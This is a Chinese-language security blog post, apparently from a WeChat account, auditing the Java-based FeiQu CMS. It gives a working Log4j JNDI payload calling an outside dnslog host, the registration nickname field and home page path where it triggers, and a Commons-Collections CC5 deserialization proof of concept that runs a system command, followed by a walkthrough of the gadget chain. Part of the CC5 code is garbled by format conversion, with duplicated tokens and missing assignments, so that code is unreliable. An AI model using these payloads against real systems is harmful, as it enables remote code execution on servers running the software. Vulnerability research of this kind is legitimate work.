> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/0LqQHuCpmHGDFqbu7hI2UA)

**java安全 飞趣CMS审计**

![图片](https://mmbiz.qpic.cn/mmbiz_gif/Jvbbfg0s6ACmmjoP6aZ0WibhYlnwMUo2BKiaQFey9TR2uzxYssKwm2sGJbqoukMxrh3Y1I6iblQT9z07YeZvibQNWg/640?wx_fmt=gif&wxfrom=5&wx_lazy=1)

最近在在审一套cms，记录一下有趣的过程。

在拿到cms的之后，突然发现，前两天xz社区的某位师傅，已经分析了该cms。所以本人在该原有发现

漏洞的基础上，进行了更深一步挖掘。

该师傅的文章： https://xz.aliyun.com/t/11137#toc-5

环境部署不做过多讲解，简单说一下遇到的"坑"：

在该项目的resources配置数据库以及redis。 redis和mysql的密码都是通过aes加密的，工具类在：

com.feiqu.common.utils.AESUtil，避免了明文展示密码。

![图片](https://mmbiz.qpic.cn/mmbiz_jpg/Jvbbfg0s6ACmmjoP6aZ0WibhYlnwMUo2B6L9dVmlVOD4WIdUibF4AAL6dnia3icEicb7FXicAa5R87ZcrtmicNG6LyHdw/640?wx_fmt=jpeg&wxfrom=5&wx_lazy=1&wx_co=1)

  

1.Log4j漏洞

首先跟着复现了一波fastjson的反序列化，但是JSON.parseObject无可控点。

![图片](https://mmbiz.qpic.cn/mmbiz_png/Jvbbfg0s6ACmmjoP6aZ0WibhYlnwMUo2BLcyqnv3aCf0Ne7UIVg74LOh73oBJS64aiaQf71M1ichQaK07Z55PriarA/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)

第二处，redisString.get这里，是由xz的师傅已经分析过。无利用点。但是在上面中发现了logger.info()。

  

![图片](https://mmbiz.qpic.cn/mmbiz_png/Jvbbfg0s6ACmmjoP6aZ0WibhYlnwMUo2BEdibtdTomLHy6ODsns9yUIZqccnrrzrj4h0IGpJdrzJEgdrK93Ria8yg/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)

所以现在测试一下log4j这个洞，可以发现是存在的

  

public class Test1 {  
public static void main(String[] args) {  
LogManager.getLogger(logtest.class);  
logger.info("${jndi:ldap://17zuzp.dnslog.cn}");  
}  
}

  

![图片](https://mmbiz.qpic.cn/mmbiz_png/Jvbbfg0s6ACmmjoP6aZ0WibhYlnwMUo2Bib4oKjtFDoyLERB4X9UibcBaZJWiaq3DBbibEDtZwLicB7oL6IewxSF4kvA/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)

所以在com.feiqu.web.controller.UserController中home函数的944行，是一个绝佳的利用点

![图片](https://mmbiz.qpic.cn/mmbiz_png/Jvbbfg0s6ACmmjoP6aZ0WibhYlnwMUo2BuRw7fpaa5rx1qzjyI6uJicmtfwQqgEujq4miacLibSzXCzGBpMP8eqxJQ/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)

经过测试，在注册的时候填入payload即可。

  

![图片](https://mmbiz.qpic.cn/mmbiz_jpg/Jvbbfg0s6ACmmjoP6aZ0WibhYlnwMUo2B6QQqttcdmuFSicld5w2D7wZ5iaibSIvmZ1Kd6pfY0gPR52b2IZE6UfDtg/640?wx_fmt=jpeg&wxfrom=5&wx_lazy=1&wx_co=1)

在根据提供的GetMapping得知url地址为： 127.0.0.1:8080/u/12/home。

![图片](https://mmbiz.qpic.cn/mmbiz_jpg/Jvbbfg0s6ACmmjoP6aZ0WibhYlnwMUo2BLCp8KiaMhkFoicMGoAmUTAwprn1Zd6Q2p6ZdVo6rBibxtwWurQ9U4a18g/640?wx_fmt=jpeg&wxfrom=5&wx_lazy=1&wx_co=1)

日志信息

  

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

DNSLOG回显如下：

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

  

经过在注册的时候，也存在log4j的使用。

  

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

payload还是在昵称这里，可以看到前端页面中name对应了FqUser工具类中。

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

  

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

当注册之后，成功利用

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

至于其它的log4j利用点就不找了，相对于xz师傅找到的log4j利用点，本人找的两个已经非常容易利用了。

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

  

  

  

collections3反序列化漏洞

在包中发现了该组件，这就用到了CC链系列了。这里用CC3版本。因为本人在进行测试CC4版本的时候。其中有些类不能被序列化了~这就凉凉。

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

直接用CC5的payload直接打就行了

  

```
`Transformer[] transformers = new Transformer[] {``new ConstantTransformer(Runtime.class),``new new Object[]    InvokerTransformer("getMethod", new Class[] {String.class, Class[ { "getRuntime", new Class[0] }),    ].class },``new new Object[]    InvokerTransformer("invoke", new Class[] {Object.class, Object[]. { null, new Object[0] }),    class },``new InvokerTransformer("exec", new Class[] { String.class}, new String[] {"calc.exe"}),``};``new ChainedTransformer(transformers);``Map innerMap = new HashMap();``LazyMap.decorate(innerMap, transformerChain);``new TiedMapEntry(outerMap,"keykey");` `new BadAttributeValueExpException(1);` `BadAttributeValueExpException.class.getDeclaredField("val");``field.setAccessible(true);``field.set(POC,tiedmap);``ObjectOutputStream objectOutputStream = new ObjectOutputStream(new``FileOutputStream("cc5.bin"));``objectOutputStream.writeObject(POC);``objectOutputStream.close();``ObjectInputStream objectInputStream = new ObjectInputStream(new``FileInputStream("cc5.bin"));``objectInputStream.readObject();``objectInputStream.close();`
```

  

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

简单分析一下CC5这条链的过程。

利用链如下：

  

```
`1ObjectInputStream.readObject()``2   BadAttributeValueExpException.readObject()``3     TiedMapEntry.toString()``4       LazyMap.get()``5         ChainedTransformer.transform()``6           ConstantTransformer.transform()``7             InvokerTransformer.transform()``8               Method.invoke()``9                 Class.getMethod()``10                   InvokerTransformer.transform()``11                     Method.invoke()``12                       Runtime.getRuntime()``13 InvokerTransformer.transform()``14 Method.invoke()`
```

前面的不过多讲解，相信大家都能看懂，这是一个命令执行

```
`Transformer[] transformers = new Transformer[] {``new ConstantTransformer(Runtime.class),``new InvokerTransformer("getMethod", new Class[] {String.class, Class[].class }, new Object[] { "getRuntime", new Class[0] }),``new InvokerTransformer("invoke", new Class[] {Object.class, Object[].class }, new Object[] { null, new Object[0] }),``new InvokerTransformer("exec", new Class[] { String.class}, new String[] {"calc.exe"}),``};``new ChainedTransformer(transformers);`
```

接着往下分析

```
`Map innerMap    new HashMap();` `Map outerMap    LazyMap.decorate(innerMap, transformerChain)    ;``TiedMapEntry    new TiedMapEntry(outerMap,"keykey");` 
```

LazyMap初始化如下，会将transformerChain存入到factory

  

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

之后在LazyMap.get中调用到了transform

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

那么谁会调用到LazyMap.get呢？

在TiedMapEntry初始化会将LazyMap作为第一个参数传入

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

所以此时关注有没有map.get方法，这样就会调用到LazyMap.get方法

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

又又又一个问题，TiedMapEntry.getValue()谁会调用？

而利用链中写到了，TiedMapEntry.toString()，其实toString调用了getValue()，从而调用到LazyMap.get方法

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

  

谁会调用TiedMapEntry.toString()？这里通过反射，将val设置为了TiedMapEntry(tiedmap)

  

```
`BadAttributeValueExpException POC = new BadAttributeValueExpException(1);``Field field = BadAttributeValueExpException .class.getDeclaredField("val");``field.setAccessible(true);``field.set(POC,tiedmap);`
```

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

最后在readObject的时候，执行了toString方法。

  

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

但是在最后，本人只找到了一处readObject

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

至于后续SQL注入的话，找了好几个，但参数都不可控，也就放弃了。

**关注公众号**  

 公众号长期更新安全类文章，关注公众号，以便下次轻松查阅  

 ![](http://mmbiz.qpic.cn/mmbiz_png/Jvbbfg0s6ACib1YxUkAP5V2ldRHEzgqytbTxUd3Kao6poq8QU460nFxylPwDGauvzVCnWibRkAI7buhwHAl7GyKQ/0?wx_fmt=png) ** moonsec ** 暗月博客 150篇原创内容   公众号